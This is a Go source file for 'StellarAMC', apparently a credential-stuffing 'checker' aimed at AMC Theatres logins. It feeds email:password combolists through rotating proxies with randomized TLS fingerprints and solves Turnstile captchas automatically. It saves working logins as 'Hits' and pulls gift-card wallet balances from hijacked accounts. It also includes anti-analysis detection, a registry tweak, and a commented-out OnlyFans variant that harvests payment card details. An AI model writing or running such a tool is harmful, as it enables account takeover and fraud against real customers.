//garble:controlflow block_splits=0 junk_jumps=0 flatten_passes=0 trash_blocks=1

package main

import (
	"StellarAMC/buggi"
	"StellarAMC/fileio"
	"StellarAMC/header"
	"StellarAMC/solver"
	"StellarAMC/userinterface"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"net/http"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"golang.org/x/sys/windows/registry"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/fatih/color"
	"github.com/sqweek/dialog"
	"github.com/zenthangplus/goccm"
)


var monitor fileio.Monitor
var config fileio.Config
var mu sync.Mutex
var program *tea.Program

func SetPortValue() {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	defer k.Close()

	err = k.SetDWordValue("MaxUserPort", 65534)

	if err != nil {
		fmt.Println(err)
	}

	err = k.SetDWordValue("TCPTimedWaitDelay", 30)

	if err != nil {
		fmt.Println(err)
	}

}



func main() {
	SetPortValue()
	if name := buggi.DetectAndReturn(); name != "" {
		os.Exit(0)
	}
	buggi.SimpleRun(1)

	//Authenticate()

	fileio.SplashScreen()

	_config, err := fileio.LoadConfig("settings.json")
	if err != nil {
		fmt.Println(color.RedString("Your config file located at 'settings.json' is invalid. Please amend it and relaunch."))
		fmt.Println(color.RedString(err.Error()))
		fmt.Scanln()
		return
	}

	config = _config
	accounts := LoadCombos()

	fmt.Println(fmt.Sprintf("[>] Combos: %d", len(accounts)))

	proxies, err := fileio.LoadProxies(config.Proxy.ProxyFile)
	if err != nil {
		fmt.Println(color.RedString("There was an error while reading your proxy file."))
		fmt.Scanln()
		return
	}

	if len(proxies) == 0 {
		fmt.Println(color.RedString("No proxies were loaded."))
		fmt.Scanln()
		return
	}

	fmt.Println(fmt.Sprintf("[>] Proxies: %d", len(proxies)))
	fmt.Println(color.GreenString(fmt.Sprintf("[>] Threads: %d", config.Checker.Threads)))

	err = monitor.InitResultDirectory()

	if err != nil {
		fmt.Println(color.RedString("There was an error creating the results directory and files."))
		fmt.Scanln()
		return
	}

	fmt.Println(color.GreenString(fmt.Sprintf("Successfully created results directory, located at '%s'", monitor.ResultsPath)))

	ccm := goccm.New(config.Checker.Threads)

	run := true

	monitor.ComboLength = len(accounts)

	go func() {
		for run {
			monitor.UpdateTitle()
			time.Sleep(300 * time.Millisecond)
		}
	}()

	fileio.ClearTerminal()
	monitor.StartTime = time.Now()
	model := userinterface.NewModel()
	program = tea.NewProgram(model)

	go func(r *bool, m *userinterface.Model) {
		if _, err := program.Run(); err != nil {
			os.Exit(1)
		}
		for {
			if userinterface.QUIT {
				(*r) = false
				fmt.Println(color.WhiteString("Clearing up buffer cache, enter \"ctrl+c\" to exit!"))
				return
			}
		}
	}(&run, &model)

	for _, account := range accounts {
		if !run {
			break
		}
		ccm.Wait()
		go func(acc fileio.Account, proxylist *[]string) {
			Worker(acc, proxylist)
			ccm.Done()
		}(account, &proxies)
	}

	ccm.WaitAllDone()
	run = false
	program.Send(tea.Quit)
	fmt.Println("Completed checking the lines")
	fmt.Scanln()
}

func LoadCombos() []fileio.Account {
	error_msg := ""
	for {
		fileio.SplashScreen()
		if error_msg != "" {
			fmt.Println(color.RedString(error_msg))
			error_msg = ""
		}
		// fmt.Println(color.YellowString("Please drag in your combo file"))
		// var filepath string
		// _, err := fmt.Scanln(&filepath)
		filepath, err := dialog.File().Filter("Text Files", "txt").Title("[StellarFA] Please input your combolist in order to start checking").Load()

		if err != nil {
			error_msg = "There was an error reading your input."
			continue
		}

		//accounts, err := fileio.LoadAccounts("./combos.txt")
		accounts, err := fileio.LoadAccounts(filepath)

		if err != nil {
			error_msg = "There was an error reading that file."
			continue
		}

		if len(accounts) == 0 {
			error_msg = "Your combolist must be longer than 0 lines."
			continue
		}

		return accounts
	}
}

func Worker(account fileio.Account, proxylist *[]string) {
	for {
		proxy := (*proxylist)[rand.Intn(len(*proxylist))]
		proxy = strings.ReplaceAll(proxy, "sessionidvariable", fileio.GenerateRandomString(10))

		cfg := header.RandomProfileConfig()
		options := []tls_client.HttpClientOption{
			tls_client.WithTimeoutSeconds(60),
			tls_client.WithClientProfile(cfg.Profile),
			tls_client.WithCookieJar(tls_client.NewCookieJar()),
			tls_client.WithRandomTLSExtensionOrder(),
			tls_client.WithProxyUrl(fmt.Sprintf("http://%s", proxy)),
		}

		client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}

		flagPayload := map[string]interface{}{
			"operationName": "FeatureFlagId",
			"variables":     map[string]interface{}{},
			"query":         "query FeatureFlagId {  __typename  viewer {    __typename    user {      __typename      id      featureFlagsId    }  }}",
		}

		body, err := json.Marshal(flagPayload)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}

		req, err := fhttp.NewRequest("POST", "https://graph.amctheatres.com/", bytes.NewReader(body))
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}
		header.SetHeaders(req, cfg)

		graphResp, err := client.Do(req)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			//fmt.Println(err)
			mu.Unlock()
			continue
		}
		defer graphResp.Body.Close()

		respBytes, err := io.ReadAll(graphResp.Body)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}
		respText := string(respBytes)

		if strings.Contains(respText, "html") {

			mu.Lock()
			monitor.Retries += 1
			mu.Unlock()
			continue
		}

		captcha, err := solver.SolveTurnstile()
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}

		payload := map[string]interface{}{
			"operationName": "Login",
			"query":         header.LoginQuery,
			"variables": map[string]string{
				"email":    account.Email,
				"password": account.Password,
				"captcha":  captcha,
			},
		}

		body, err = json.Marshal(payload)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}

		req, err = fhttp.NewRequest("POST", "https://graph.amctheatres.com/", bytes.NewReader(body))
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}
		header.SetHeaders(req, cfg)

		resp, err := client.Do(req)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			fmt.Println(err)
			mu.Unlock()
			continue
		}
		defer resp.Body.Close()

		respBytes, err = io.ReadAll(resp.Body)
		if err != nil {
			mu.Lock()
			monitor.Errors += 1
			mu.Unlock()
			continue
		}

		status := header.CheckLoginStatus(string(respBytes))
		if status == "INVALID" {
			mu.Lock()
			monitor.Checked += 1
			monitor.Invalid += 1
			mu.Unlock()
			PrintData(fmt.Sprintf("%s:*********", account.Email), "Invalid username or password", "#FF0000")
			return
		} else if status == "UNKNOWN" {
			monitor.SaveAccount(fmt.Sprintf("%s:%s", account.Email, account.Password), "Unknown_Retries")
			mu.Lock()
			monitor.Retries += 1

			mu.Unlock()
			continue
		} else {
			if config.Checker.FilterGiftcards == false {
				PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Valid Account (profile:%s)", cfg.Browser), "#31F505")

				hitLine := fmt.Sprintf("%s:%s", account.Email, account.Password)
				monitor.SaveAccount(hitLine, "Hits")
				mu.Lock()
				monitor.Checked += 1
				monitor.Hits += 1
				mu.Unlock()
				return
			} else {
				var result header.WalletResponse

				payload := map[string]interface{}{
					"operationName": "wallet",
					"variables":     map[string]interface{}{},
					"query":         header.WalletQuery,
				}

				body, err := json.Marshal(payload)
				if err != nil {
					mu.Lock()
					monitor.Errors += 1
					mu.Unlock()
					continue
				}

				reqr, err := fhttp.NewRequest("POST", "https://graph.amctheatres.com/", bytes.NewReader(body))
				if err != nil {
					mu.Lock()
					monitor.Errors += 1
					fmt.Println(err)
					mu.Unlock()
					continue
				}
				header.SetHeaders(reqr, cfg)

				resp, err := client.Do(reqr)
				if err != nil {
					fmt.Println(err)
					mu.Lock()
					monitor.Errors += 1
					mu.Unlock()
					continue
				}
				defer resp.Body.Close()

				if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {

					mu.Lock()
					monitor.Errors += 1
					mu.Unlock()
					continue

				}

				hitLine := fmt.Sprintf("%s:%s", account.Email, account.Password)
				monitor.SaveAccount(hitLine, "Hits")

				mu.Lock()
				monitor.Checked += 1
				monitor.Hits += 1
				mu.Unlock()

				if balance, ok, giftCardStatus := header.CheckGiftCards(result); ok {
					PrintData(
						fmt.Sprintf("%s:*********", account.Email),
						fmt.Sprintf("Valid Account (Estimated Balance : $%.2f | GiftCards: %s)", balance, giftCardStatus),
						"#31F505",
					)

					balanceLine := fmt.Sprintf("%s:%s - Estimated Balance : $%.2f", account.Email, account.Password, balance)
					balanceLineLOG := fmt.Sprintf("%s:%s||$%.2f||%s", account.Email, account.Password, balance, giftCardStatus)

					monitor.SaveAccount(balanceLine, "Balance")
					monitor.SaveAccount(balanceLineLOG, "BalanceFormatted")
	
					mu.Lock()
					monitor.WithCards += 1
					monitor.TotalBalance += balance
					mu.Unlock()
				} else {
					PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Valid Account Without Balance"), "#FFFF00")
				}
				return
			}
		}

		/*

				var captcha string

				solverClient := cycler.Next()
				if config.SolverSettings.ProxyType == "ipv6" {
					captcha, err = solverClient.SolveTurnstile("https://onlyfans.com/", "0x4AAAAAAAxTpmbMvo7Qj6zy", "login", config.SolverSettings.IPV6)

				} else {
					captcha, err = solverClient.SolveTurnstile("https://onlyfans.com/", "0x4AAAAAAAxTpmbMvo7Qj6zy", "login", "http://"+dc_proxy)
				}
				fmt.Println(err)
				if err != nil {
					// Error solving captcha
					mu.Lock()

					monitor.Errors += 1
					mu.Unlock()
					continue
				}
				oF := onlyfans.NewOnlyFans(config.Checker.PurchaseLimit, useragent, client)

				status, err := oF.Start(account.Email, account.Password, captchaKey, captcha)

				if err != nil {
					// Error with requests (?)
					mu.Lock()
					monitor.Errors += 1
					fmt.Println(err)
					mu.Unlock()
					continue
				}

				if !status {
					// Dead account
					if oF.AccountCategory == "Retry" {
						mu.Lock()
						monitor.Retries += 1
						mu.Unlock()
						continue
					}

					mu.Lock()
					monitor.Invalid += 1
					monitor.Checked += 1
					mu.Unlock()
					return
				}

				mu.Lock()
				monitor.Hits += 1
				monitor.Checked += 1
				hits := false

				category := oF.AccountCategory

				// Assume all cards are expired
				expired := !strings.Contains(oF.AccountInfo.CardsData, "Valid")

				if category == "HasErrors" {
					if (len(oF.AccountInfo.Cards) > 0 || len(oF.AccountInfo.VCards) > 0) && !expired {
						PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Cards: %d - ValidCards: %d", len(oF.AccountInfo.Cards), len(oF.AccountInfo.VCards)), "#FFFF00")
						monitor.ErrorAccs += 1
					} else {
						category = "REPLACE"
					}
				} else if oF.AccountInfo.Performer {
					if len(oF.AccountInfo.VCards) > 0 {
						hits = true
					}
					PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Cards: %d - Creator: True", len(oF.AccountInfo.VCards)), "#31F505")
					monitor.Creators += 1
				} else if category == "Locked" {
					PrintData(fmt.Sprintf("%s:*********", account.Email), "Locked Account", "#FF0000")
					monitor.Locked += 1
				}
				if category == "REPLACE" {
					if (len(oF.AccountInfo.Cards) > 0 || len(oF.AccountInfo.VCards) > 0) && !expired {
						category = "Hits"
						coe := "False"
						if oF.AccountInfo.Performer {
							coe = "True"
						}
						PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Cards: %d - Creator: %s", len(oF.AccountInfo.VCards), coe), "#31F505")
						monitor.WithCards += 1
					} else {
						// Custom
						category = "Custom"
						PrintData(fmt.Sprintf("%s:*********", account.Email), fmt.Sprintf("Cards: %d - Errors: %t", len(oF.AccountInfo.VCards), oF.HasError), "#FFA500")
						monitor.Customs += 1
					}
				}

				normal_cap, creator_cap := oF.GetAsCapture(config.Checker.FilterPurchases, config.Checker.CapturePurchases)
				monitor.SaveAccount(account, normal_cap, category, hits, creator_cap)

				mu.Unlock()
				return
			}
		*/
	}
}

func Input(message string) string {
	fmt.Print(message)

	var input string
	fmt.Scanln(&input)
	return input
}

func PrintData(content string, capture string, hexcode string) {
	now := time.Now().Format("15:04:05")
	errorStyle := lipgloss.NewStyle().Foreground(lipgloss.Color(hexcode)).Render

	program.Send(userinterface.ResultMsg{Content: content, Capture: errorStyle(capture), Timestamp: now})
}
